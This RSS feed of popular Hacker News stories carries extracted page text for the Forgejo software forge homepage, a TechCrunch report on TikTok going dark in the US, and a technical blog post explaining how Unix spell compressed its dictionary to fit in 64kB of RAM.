<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Sun, 19 Jan 2025 11:30:01 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Forgejo: A self-hosted lightweight software forge (158 pts)]]></title>
            <link>https://forgejo.org/</link>
            <guid>42753523</guid>
            <pubDate>Sun, 19 Jan 2025 04:15:26 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://forgejo.org/">https://forgejo.org/</a>, See on <a href="https://news.ycombinator.com/item?id=42753523">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>  <div> <hgroup>  <p>
Beyond coding.
<span>We forge.</span> </p> </hgroup> <div> <picture> <source srcset="
								https://forgejo.org/_astro/mascot-dark.1omhhgvT_1wP5Ng.webp 407w,
								https://forgejo.org/_astro/mascot-dark.1omhhgvT_FT0Ui.webp 814w,
								https://forgejo.org/_astro/mascot-dark.1omhhgvT_1RR3an.webp 1629w,
							" type="image/webp" sizes="(max-width: 767px) 407px, (max-width: 1479px) 814px, 1629px"> <source srcset="
								https://forgejo.org/_astro/mascot-dark.1omhhgvT_Z1a8nnm.png 407w,
								https://forgejo.org/_astro/mascot-dark.1omhhgvT_Z214sgk.png 814w,
								https://forgejo.org/_astro/mascot-dark.1omhhgvT_ZAasCY.png 1629w,
							" type="image/png" sizes="(max-width: 767px) 407px, (max-width: 1479px) 814px, 1629px"> <img src="https://forgejo.org/_astro/mascot-dark.1omhhgvT_Zm0N2n.webp" alt="" loading="eager" width="1629" height="1273" decoding="async"> </picture> </div> <div> <p> <span>Forgejo</span>
is a self-hosted lightweight software forge.<br>
Easy to install and low maintenance, it just does the job.
</p> <p>
Brought to you by an inclusive community under the umbrella of
<a href="https://docs.codeberg.org/getting-started/what-is-codeberg/#what-is-codeberg-e.v.%3F">Codeberg e.V.</a>, a democratic non-profit organization, Forgejo can be trusted to be exclusively Free Software. You can
						create an account on
<a href="https://codeberg.org/">Codeberg</a>
and
<a href="https://codeberg.org/forgejo-contrib/delightful-forgejo#public-instances">other instances</a>
or download it to self-host your own. It focuses on security, scaling, federation and privacy. Learn more about
<a href="https://forgejo.org/compare/">how it compares with other forges</a>.
</p>  </div> </div> <div id="features"> <div> <!-- <p class="text-base mb-4 text-primary-600 dark:text-steel-200 font-semibold tracking-wide uppercase">
				Highlights
			</p> --> <h2>
Forge great software with Forgejo
</h2> <p>
Take back control of your software development process, self-host your projects and get everyone involved in
				delivering quality software on the same page.
</p> </div> <div> <div> <div> <h3> Simple software project management </h3> <p><strong>Ease of use</strong> is important to get things done efficiently. Forgejo’s user experience is designed for <strong>collaboration</strong> and <strong>productivity</strong>.</p> </div><div> <h3> Self-hosted alternative to GitHub </h3> <p><strong>Liberate your software</strong> from proprietary shackles. Forgejo offers a familiar environment to GitHub users, allowing smooth transition to a <strong>platform you own</strong>.</p> </div><div> <h3> Easy to install and maintain </h3> <p>Hosting your own software forge does not require expert skills. With Forgejo you can control your server with <strong>minimal effort</strong>.</p> </div> </div><div> <div> <h3> Lightweight and performant </h3> <p>With a <strong>rich feature set</strong>, Forgejo still has a <strong>low server profile</strong> and requires <strong>an order of magnitude less resources</strong> than other forges.</p> </div><div> <h3> Guaranteed 100% Free Software </h3> <p>Forgejo will always be <strong>Free and Open Source Software</strong>. Furthermore we exclusively use Free Software for our own project development.</p> </div><div> <h3> Beyond coding, we forge ahead </h3> <p>An exciting future awaits. We will innovate the Software Forge and enable <strong>collaborative</strong> software development facilitated by <strong>decentralized</strong> platforms.</p> </div> </div> </div> </div> <div> <h2>
Get Involved
</h2> <p> <strong>
Forgejo consists of motivated people, and we are looking forward to
<a href="https://forgejo.org/docs/next/contributor/">your contribution</a> </strong>.<br>
Feel free to help in the domains of
<a href="https://forgejo.org/docs/next/contributor/localization/">localization</a>,
<a href="https://codeberg.org/forgejo/forgejo/issues">code, federation, releases management</a>,
<a href="https://codeberg.org/forgejo/user-research/">user research</a>,
<a href="https://codeberg.org/forgejo/design">UX and usability</a>,
<a href="https://codeberg.org/forgejo/code-of-conduct/issues">community management</a>,
<a href="https://codeberg.org/forgejo/docs/issues">documentation</a>,
<a href="https://codeberg.org/forgejo/website/issues">web design</a>,
<a href="https://codeberg.org/forgejo/governance/issues">governance</a> and more.
</p> <p> <a href="https://codeberg.org/forgejo/forgejo" target="_blank" rel="noopener"> <svg width="1em" height="1em" viewBox="0 0 24 24" data-icon="tabler:git-merge">  <use xlink:href="#ai:tabler:git-merge"></use>  </svg> Contribute on Codeberg
</a> <a href="https://liberapay.com/forgejo" target="_blank" rel="noopener"> <svg width="1em" height="1em" viewBox="0 0 24 24" data-icon="mdi:heart">  <symbol id="ai:mdi:heart"><path fill="currentColor" d="m12 21.35l-1.45-1.32C5.4 15.36 2 12.27 2 8.5C2 5.41 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.08C13.09 3.81 14.76 3 16.5 3C19.58 3 22 5.41 22 8.5c0 3.77-3.4 6.86-8.55 11.53z"></path></symbol><use xlink:href="#ai:mdi:heart"></use>  </svg> Donate
</a> </p> </div>  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[TikTok goes dark in the US (618 pts)]]></title>
            <link>https://techcrunch.com/2025/01/18/tiktok-goes-dark-in-the-u-s/</link>
            <guid>42753396</guid>
            <pubDate>Sun, 19 Jan 2025 03:51:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://techcrunch.com/2025/01/18/tiktok-goes-dark-in-the-u-s/">https://techcrunch.com/2025/01/18/tiktok-goes-dark-in-the-u-s/</a>, See on <a href="https://news.ycombinator.com/item?id=42753396">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
		
		<div>
			<div>
<p id="speakable-summary">TikTok has gone dark in the U.S., the result of a federal law that bans the popular short-form video app for millions of Americans — at least for now.</p>

<p>TikTok users began receiving a message about the ban around 10:30 p.m. Eastern. As of Saturday evening, the app was also no longer available in the Apple or Google Play app store.</p>







<p>“Sorry, TikTok isn’t available right now,” the message reads. “A law banning TikTok has been enacted in the U.S. Unfortunately, that means you can’t use TikTok for now.”</p>

<p>The message also suggests this may only be a temporary disappearance. Tiktok credits President-elect Donald Trump for indicating “he will work with us on a solution to reinstate TikTok once he takes office,” with users urged to “stay tuned!”</p>

<figure><img loading="lazy" decoding="async" width="1796" height="1264" src="https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?w=680" alt="" srcset="https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png 1796w, https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?resize=150,106 150w, https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?resize=300,211 300w, https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?resize=768,541 768w, https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?resize=680,479 680w, https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?resize=1200,845 1200w, https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?resize=1280,901 1280w, https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?resize=430,303 430w, https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?resize=720,507 720w, https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?resize=900,633 900w, https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?resize=800,563 800w, https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?resize=1536,1081 1536w, https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?resize=668,470 668w, https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?resize=533,375 533w, https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?resize=877,617 877w, https://techcrunch.com/wp-content/uploads/2025/01/Screenshot-2025-01-18-at-8.44.16PM.png?resize=708,498 708w" sizes="auto, (max-width: 1796px) 100vw, 1796px"></figure>

<p>The company warned earlier this week the app’s disappearance was imminent, <a href="https://techcrunch.com/2025/01/18/tiktok-says-it-will-go-dark-sunday-unless-biden-offers-definitive-statement/">saying Friday that it would “go dark”</a> unless President Joe Biden’s administration made a “definitive statement” that it wouldn’t enforce the ban.</p>

<p>Biden signed the law in April, requiring TikTok’s owner ByteDance to sell the app or see it banned in the United States, due to concerns over potential Chinese surveillance and propaganda. And while efforts to force ByteDance to divest go back to Trump’s first administration, he has taken a very different tone recently. Trump <a href="https://techcrunch.com/2024/12/28/trump-asks-supreme-court-to-pause-imminent-tiktok-ban/">asked the Supreme Court to delay the ban</a> and said he would <a rel="nofollow" href="https://www.nbcnews.com/politics/donald-trump/trump-likely-give-tiktok-90-day-extension-avoid-ban-rcna188258">“most likely”</a> give the company a 90-day extension.</p>

<p>And while the Supreme Court issued a ruling <a href="https://techcrunch.com/2025/01/17/supreme-court-upholds-tiktok-ban/">upholding the law Friday</a>, the Biden administration seemed inclined to<a href="https://techcrunch.com/2025/01/18/tiktok-says-it-will-go-dark-sunday-unless-biden-offers-definitive-statement/"> leave the app’s fate in the hands of the next president</a>. White House Press Secretary Karine Jean-Pierre noted that with Sunday being Biden’s last day in office, “actions to implement the law simply must fall to the next Administration.” Deputy Attorney General Lisa Monaco issuing a similar statement that “the next phase of this effort — implementing and ensuring compliance with the law after it goes into effect on January 19 — will be a process that plays out over time.”</p>


<p>TikTok, however, suggested that this was not enough to assurance for “critical service providers” to continue listing or hosting the app in the US, unless the Biden administration made the aforementioned “definitive statement.” Jean-Pierre called TikTok’s response “a stunt” and claimed there’s “no reason for TikTok or other companies to take actions in the next few days before the Trump administration takes office on Monday.”</p>

<p>Stunt or not, TikTok is gone for now.</p>
</div>

			

			


			
			
			

			




			
			
			

			



			
<div>
			
<div>
	
	
	
	

	
<div>
	<p>
		Kyle Wiggers is a senior reporter at TechCrunch with a special interest in artificial intelligence. His writing has appeared in VentureBeat and Digital Trends, as well as a range of gadget blogs including Android Police, Android Authority, Droid-Life, and XDA-Developers. He lives in Brooklyn with his partner, a piano educator, and dabbles in piano himself. occasionally — if mostly unsuccessfully.	</p>
</div>


	
	<p>
		<a data-ctatext="View Bio" data-destinationlink="https://techcrunch.com/author/kyle-wiggers/" data-event="button" href="https://techcrunch.com/author/kyle-wiggers/">View Bio <svg style="width: 1em;" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><path fill="var(--c-svg, currentColor)" d="M16.5 12 9 19.5l-1.05-1.05L14.4 12 7.95 5.55 9 4.5z"></path></svg></a>
	</p>
	
</div>
			
<div>
	
	
	
	

	
<div>
	<p>Anthony Ha is TechCrunch’s weekend editor. Previously, he worked as a tech reporter at Adweek, a senior editor at VentureBeat, a local government reporter at the Hollister Free Lance, and vice president of content at a VC firm. He lives in New York City.	</p>
</div>


	
	<p>
		<a data-ctatext="View Bio" data-destinationlink="https://techcrunch.com/author/anthony-ha/" data-event="button" href="https://techcrunch.com/author/anthony-ha/">View Bio <svg style="width: 1em;" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><path fill="var(--c-svg, currentColor)" d="M16.5 12 9 19.5l-1.05-1.05L14.4 12 7.95 5.55 9 4.5z"></path></svg></a>
	</p>
	
</div>
	</div>


			


		</div>
		

		
		<div id="wp-block-techcrunch-most-popular-posts__heading">
<h2 id="h-most-popular">Most Popular</h2>

</div>
		
	</div><div>
		<div>
	<div>
		<div>
			<h3>Newsletters</h3>
			
		</div>
		<p>Subscribe for the industry’s biggest tech news</p>
	</div>
	<form method="POST" action="/">
		
	</form>
	
</div>


		
		<h2>Related</h2>
		

		
		
		

		
		<div>

<h2>Latest in Social</h2>




</div>
		

	</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[How Unix spell ran in 64kb RAM (148 pts)]]></title>
            <link>https://blog.codingconfessions.com/p/how-unix-spell-ran-in-64kb-ram</link>
            <guid>42752604</guid>
            <pubDate>Sun, 19 Jan 2025 00:31:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.codingconfessions.com/p/how-unix-spell-ran-in-64kb-ram">https://blog.codingconfessions.com/p/how-unix-spell-ran-in-64kb-ram</a>, See on <a href="https://news.ycombinator.com/item?id=42752604">Hacker News</a></p>
<div id="readability-page-1" class="page"><div dir="auto"><p>How do you fit a 250kB dictionary in 64kB of RAM and still perform fast lookups? For reference, even with modern compression techniques like gzip -9, you can't compress this file below 85kB.</p><div><p><span>In the 1970s, Douglas McIlroy faced this exact challenge while implementing the spell checker for Unix at AT&amp;T. The constraints of the PDP-11 computer meant the entire dictionary needed to fit in just 64kB of RAM. A seemingly impossible task.</span></p><p><span>Instead of relying on generic compression techniques, he took advantage of the properties of the data and developed a compression algorithm that came within 0.03 bits of the theoretical limit of possible compression. To this day, it remains unbeaten. </span></p></div><p>The story of Unix spell is more than just historical curiosity. It's a masterclass in engineering under constraints: how to analyze a problem from first principles, leverage mathematical insights, and design elegant solutions that work within strict resource limits.</p><p>If you're short on time, here's the key engineering story:</p><ul><li><p>The Unix spell started in the 1970s as an afternoon prototype by Steve Johnson at AT&amp;T, before Douglas McIlroy rewrote it to improve its performance and accuracy.</p></li><li><p>McIlroy's first innovation was a clever linguistics-based stemming algorithm that reduced the dictionary to just 25,000 words while improving accuracy.</p></li><li><p>For fast lookups, he initially used a Bloom filter—perhaps one of its first production uses. Interestingly, Dennis Ritchie provided the implementation. They tuned it to have such a low false positive rate that they could skip actual dictionary lookups.</p></li><li><p>When the dictionary grew to 30,000 words, the Bloom filter approach became impractical, leading to innovative hash compression techniques.</p></li><li><p>They computed that 27-bit hash codes would keep collision probability acceptably low, but needed compression.</p></li><li><p>McIlroy's solution was to store differences between sorted hash codes, after discovering these differences followed a geometric distribution.</p></li><li><p>Using Golomb's code, a compression scheme designed for geometric distributions, he achieved 13.60 bits per word—remarkably close to the theoretical minimum of 13.57 bits.</p></li><li><p>Finally, he partitioned the compressed data to speed up lookups, trading a small memory increase (final size ~14 bits per word) for significantly faster performance.</p></li></ul><p>The rest of the article expands each of these points and gives a detailed explanation with all the math and logic behind them.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fce523ed3-b3aa-4cf3-b06a-4d67e70d838a_800x529.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fce523ed3-b3aa-4cf3-b06a-4d67e70d838a_800x529.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fce523ed3-b3aa-4cf3-b06a-4d67e70d838a_800x529.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fce523ed3-b3aa-4cf3-b06a-4d67e70d838a_800x529.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fce523ed3-b3aa-4cf3-b06a-4d67e70d838a_800x529.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fce523ed3-b3aa-4cf3-b06a-4d67e70d838a_800x529.jpeg" width="800" height="529" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/ce523ed3-b3aa-4cf3-b06a-4d67e70d838a_800x529.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:529,&quot;width&quot;:800,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;A PDP-11 machine, source: Wikipedia&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="A PDP-11 machine, source: Wikipedia" title="A PDP-11 machine, source: Wikipedia" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fce523ed3-b3aa-4cf3-b06a-4d67e70d838a_800x529.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fce523ed3-b3aa-4cf3-b06a-4d67e70d838a_800x529.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fce523ed3-b3aa-4cf3-b06a-4d67e70d838a_800x529.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fce523ed3-b3aa-4cf3-b06a-4d67e70d838a_800x529.jpeg 1456w" sizes="100vw" fetchpriority="high"></picture></div></a><figcaption>A PDP-11 machine, source: Wikipedia</figcaption></figure></div><p>In order to secure funding for Unix, Ken Thompson and Dennis Ritchie pitched Unix as a text processing system for the patents department to AT&amp;T. Naturally, a text processing system needed a spell checker as well. </p><p>The first version of Unix spell was written by Steve Johnson in 1975 which was  a prototype. Jon Bentley mentions that Steve wrote it in one afternoon. Even though it worked, it was not very accurate. </p><p>It was pretty simple. It would split the input file into a stream of words, do some light preprocessing such as remove numbers and special characters, convert to lower case, then sort, unique, and finally pass the list to the spell program which would simply check for the existence of those words in a dictionary on the disk.</p><p>Because of its simplistic implementation, it was not very accurate, and also slow because of dictionary lookups on the disk.</p><p>After seeing the adoption of the initial version, Douglas McIlroy took up the project to rewrite it with the goal of improving the accuracy and performance of the tool. He worked on two separate fronts both involving some very clever engineering:</p><ul><li><p>Building an affix removal algorithm for reducing words to their stems, and a compact dictionary consisting of the stem words</p></li><li><p>A compact data structure for loading the dictionary into memory for doing fast lookups</p></li></ul><p>This article is going to be focused on the data structure design part, but let’s spend a section to get an overview on the affix removal algorithm to see how it worked.</p><p>Using a full fledged dictionary for doing lookups was slow because the computers those days had only a few kilobytes of main memory and using disk based lookups was even more slower. </p><p>Douglas McIlroy came up with the idea of an algorithm which would iteratively remove common prefixes and suffixes from a word and look up a dictionary to see if the reduced word is present in it or not. The algorithm would follow the affix removal process until there were no affixes left to remove and if even after this the word was not present in the dictionary, then it would be flagged as a misspelling.</p><p>For instance, the algorithm would reduce the word “misrepresented” to “present” by removing the prefixes “mis”, “re”, and the suffix “ed”. And because “present” is a valid word in the dictionary, it would not flag it as a misspelling.</p><p>This affix removal technique was not 100% accurate and would sometimes let misspelled words pass through. But, such occurrences were deemed acceptable at that time. He also implemented a bunch of exceptions to these rules to avoid some of the common errors. </p><p>Overall, this algorithm resulted in a very compact dictionary. The final dictionary consisted of 25,000 words, which seemed possible to load into memory with a well engineered data structure.</p><p>Let’s move on to discussing how he managed to implement in-memory dictionary lookups with just 64 kB of memory.</p><div><p>Bloom published his work on Bloom filter in 1970 while the Unix spell was developed in the mid-1970s. At this time, Bloom filter was not even called Bloom filter. In his paper, Douglas calls it a “superimposed code scheme”. </p><p>Interestingly, the Bloom filter implementation he used was given to him by Dennis Ritchie.</p></div><p>Even though the dictionary size was 25,000 words, it was still not possible to load it as it is in just 64kB of RAM. Besides, it also needed fast lookups. </p><p><span>The first data structure that Douglas used was a Bloom filter. In the paper he doesn’t call it Bloom filter, instead he refers to it as a “superimposed coding scheme”, attributed to </span><a href="https://dl.acm.org/doi/pdf/10.1145/362686.362692" rel="">Bloom’s paper from 1970</a><span>. Interestingly, he gives the credit for the implementation of the Bloom filter he used to Dennis Ritchie.</span></p><p>A Bloom filter consists of a bit table initialized to all zeros. To add an item to the Bloom filter, you apply multiple hash functions to the item. Each hash function generates an index in the table, and that bit index is set to 1. If k hash functions are used, then, k different bit indices are turned on in the table.</p><blockquote><h5><em><span>For a more detailed explanation of Bloom filter, please check out </span><a href="https://blog.codingconfessions.com/p/bloom-filters-and-beyond" rel="">my article on Bloom filters</a><span>.</span></em></h5></blockquote><p><span>Looking up an item, whether it exists in the table or not, requires the same procedure. You need to apply the k hash functions, and for each of them check if the corresponding bit is set to 1 in the table or not. If even one of the bits is not on, then it means that the item is not present in the dataset. However, if all the bits are set, then it indicates that the item </span><em>might</em><span> be present, but this may also be a false positive. </span></p><p>False positives can occur because of hash collisions. When querying for an item, we cannot be 100% sure if a bit is on in the table because of the query item, or because of a hash collision with another item. </p><p>When using Bloom filter, you need to implement a strategy to handle false positives. For instance, in this case it could mean doing a full dictionary search. But that would defeat the whole purpose of using a Bloom filter, which was to save memory and do fast dictionary lookups. In the case of a spell checker, most of the words exist in the dictionary and only a fraction of words are misspelled, so we would be checking the full dictionary quite a lot.</p><p><span>However, a Bloom filter can be tuned to achieve a desired false positive rate. The following formula computes the false positive probability for a Bloom filter with a given size </span><code>n</code><span>, number of inserted items </span><code>m</code><span>, and number of hash functions </span><code>k</code><span>. </span></p><div data-component-name="Latex"><p><span>\(\begin{align*}
&amp;\text{q} \approx \left( 1 - e^{-\frac{kn}{m}} \right) \\
&amp;\text{where:} &amp; \\
&amp;\text{q}:\ \text{Probability that a bit is 1} \\
&amp;m: \ \text{Number of bits in the Bloom filter} \\
&amp;k: \ \text{Number of hash functions used} \\
&amp;n: \ \text{Number of elements inserted}
\end{align*}
\)</span></p></div><p>In his paper, Douglas mentions that a false positive probability of 1 in 2000 was acceptable to them, which meant that for such a low false positive rate, they did not need to consult the dictionary. </p><p>As they had a dictionary of 25,000 items, the number of items was fixed. They fixed the bit table size at 400,000 bits because of the limited amount of memory. Based on these factors, using 11 hash functions allowed them to keep the false positive rate at around 1/2000.</p><p>They used the Bloom filter based spell implementation for a while. In the paper, Douglas mentions that even though the false positive rate was acceptable, in the wild, they were encountering a lot of new words that needed to be added to the dictionary. This led to the dictionary size going up from 25,000 to 30,000.</p><p>However, for a dictionary of this size, their Bloom filter required a bigger bit table size which was not possible for them. As a result, Douglas looked for alternate data structure designs to be able to fit a dictionary of 30,000 words in memory with similar lookup performance and accuracy.</p><p>As the dictionary size exploded from 25,000 to 30,000, Douglas needed a more memory efficient data structure to hold the dictionary in memory. </p><p>A hash table was an attractive solution, but it would have consumed much more memory than a Bloom filter because it requires storing the hash, as well as, the actual words to handle collisions.</p><p>Instead of a full hash table, Douglas decided to store just the hashes of the words. The lookup required computing the hash of the input word, and then checking for its existence in the hashes using a scan. </p><p>One intuition for doing so might have been that the individual words can be of varying lengths, but a hash function will naturally compress them down to a fixed number of bits, and that may possibly allow them to fit the hashes in memory.</p><p>But hashes can collide, so they needed a large enough hash code to have an acceptably low probability of collisions.</p><p><span>If each word in the dictionary is hashed to a hash code of size </span><code>b</code><span> bits, then there are </span><code>2^b</code><span> total possible hash codes in that space. If the size of the dictionary is </span><code>v</code><span> words, then the probability of a hash collision can be computed as:</span></p><div data-component-name="Latex"><p><span>\(\begin{align*}
\text{P(hash collision)} = \frac{v}{2^b}
\end{align*}\)</span></p></div><p>They had a dictionary of 30,000 words, which is ~2^15 words. Moreover, he mentions that a collision probability of 1 in 2^12 was acceptable to them. This gave a hash code size of 27 bits.</p><p>But 27-bit hash codes were too big: with 2^15 words, they needed 2^15 * 27 bits of memory, while the PDP-11 had only 2^15 * 16 bits (64kB) of RAM—compression was essential. </p><p>Before implementing any compression algorithm, we need to know what is the theoretical minimum number of bits we can achieve to compress this piece of data. It acts as a benchmark to tell us how well we are able to compress the data.</p><p><span>This theoretical minimum is computed using the information content of the event which generated the data we are trying to compress. This concept comes from </span><a href="https://en.wikipedia.org/wiki/Information_theory" rel="">information theory</a><span> which is the underpinning foundation for all of the data compression techniques. </span></p><p><span>The basic idea behind </span><a href="https://en.wikipedia.org/wiki/Information_content" rel="">information content</a><span> is to use the probability of an event to determine how many bits are needed to encode it without loss of information. </span></p><p>A highly likely event carries less information (for instance a 100% probable event has no information and needs 0 bits to encode), while a less probable event contains much more information and needs more bits. There is an inverse relationship between the probability of an event and its information content, which leads to the following formula:</p><div data-component-name="Latex"><p><span>\(\begin{align*}
&amp;\text{I(E)} = \log_2\left(\frac{1}{P(E)}\right) \\
&amp;\text{Or, I(E) = } -\log_2{P(E)} \\
&amp;\text{where P(E) is } \text{probability of event E}
\end{align*}\)</span></p></div><p>Now, to compute the information content of a set of hash codes, we need to figure out the probability of generating them.</p><p><span>If the size of a hash code is </span><code>b</code><span> bits, then there are a total of </span><code>2^b</code><span> possible hash codes in that space. Out of that, we are selecting a set of </span><code>v</code><span> unique hash codes. </span></p><div data-component-name="Latex"><p><span>\(

\begin{align*}


\text{The total number of ways to select such sets = }\binom{2^b}{v}
\end{align*}
\)</span></p></div><p>Therefore, the probability of any one of these sets of being generated is:</p><div data-component-name="Latex"><p><span>\(\begin{align*}
\text{P} = 
\frac{1}{\binom{2^b}{v}}
\end{align*}
\)</span></p></div><p>Thus, the information content of these hash codes is:</p><div data-component-name="Latex"><p><span>\(\begin{align*}
&amp;I(E) = - \log_2\left(\frac{1}{\binom{2^b}{v}}\right) \\
&amp;= \log_2\left(\binom{2^b}{v}\right) \\
&amp;= \log_2\left(\frac{(2^b)!}{v! \, (2^b - v)!}\right)
\end{align*}\)</span></p></div><p><span>To simplify things, we can use </span><a href="https://en.wikipedia.org/wiki/Stirling%27s_approximation" rel="">Stirling’s approximation</a><span>:</span></p><div data-component-name="Latex"><p><span>\(\begin{align*}
&amp;\text{Stirling's approximation: } \quad \log_2(n!) \approx n \log_2(n) - n \log_2(e), \\
\end{align*}
\)</span></p></div><p><span>The paper makes another simplifying assumption that the number of words in the dictionary (30,000) is much smaller than the total number of hash codes (2^27), i.e., </span><code>v « 2^b</code><span>, this allows them to simplify </span><code>(2^b - v)</code><span> as  </span><code>2^b</code><span> in the above computation. </span></p><p>Using these two approximations leads to the following formula for the information content:</p><div data-component-name="Latex"><p><span>\(\begin{align*}
&amp;I(E) \approx v\left[b - \log_2\left(\frac{v}{e}\right)\right]
\end{align*}\)</span></p></div><p><span>Plugging in </span><code>v=30,000</code><span> and </span><code>b=27</code><span>, the minimum number of bits needed to encode a single hash code turns out to be 13.57, which was ~50% shorter than the original hash codes, and within the capacity of the PDP-11’s memory.</span></p><p><span>At this point they knew how much compression they could achieve but the bigger question was how to get there. Instead of compressing the raw hash codes, what if they computed and stored the differences between successive hash codes (in their sorted order)? This is similar to how </span><a href="https://en.wikipedia.org/wiki/Delta_encoding" rel="">delta encoding</a><span> works, but not quite the same.</span></p><p>There were a couple of advantages of working with hash differences.</p><ul><li><p>By definition the differences were smaller than the raw hash codes</p></li><li><p>And many of the difference value would repeat because the difference of several hash codes might be the same. </p></li></ul><p>This implied that it was easier to compress these differences than the hash codes. </p><p>Hash differences were computed by sorting the hash codes and taking differences between consecutive values.</p><p>For instance:</p><pre><code>sorted hash codes: 5, 14, 21, 32, 55, 67
hash differences: 5, 9, 7, 11, 23, 12</code></pre><p>Let’s also see how the lookup of a word worked when they stored hash differences instead of the actual value.</p><p>To check if a word exists in the dictionary or not, they would compute the hash of the word and check for its existence in the dictionary via a simple algorithm. </p><pre><code>lookup(input_hashcode) -&gt; bool:
  sum = hash_differences[0]
  i = 1
  while True:
    sum += hash_differences[i]
    if sum == input_hashcode:
      return True
    if sum &gt; input_hashcode:
      return False
    i += 1</code></pre><p>Now, let’s discuss how they came up with a compression scheme for this data.</p><p>The basic principle behind lossless compression is to assign shorter codes to symbols with higher probabilities, and longer codes to symbols with lower probabilities. This makes sense because symbols with higher probabilities tend to occur more frequently in the data and assigning them shorter codes means higher compression rate.</p><p>But this requires computing the probability distribution of all the symbols in the data, and then using it to generate compressed codes. The probability distribution table is needed at decompression time as well to perform the decoding. </p><p>This had two problems for Douglas:</p><ul><li><p>Holding a probability distribution table for ~30,000 symbols in memory would have taken away any compression advantage he was getting from compression itself. So he needed a scheme which was free of this requirement.</p></li><li><p>Computing the probabilities of the hash differences would have been time expensive. All the 30,000 possible hash difference values, their sums and counts would not have been possible to keep in memory for computing their probabilities. So, it would have required an expensive disk based data structure to compute these probabilities.</p></li></ul><p>But McIlroy came up with an elegant solution by recognizing that the hash differences followed a geometric distribution, enabling an efficient compression scheme. Let’s first understand how these hash difference values are geometrically distributed.</p><p><span>The </span><a 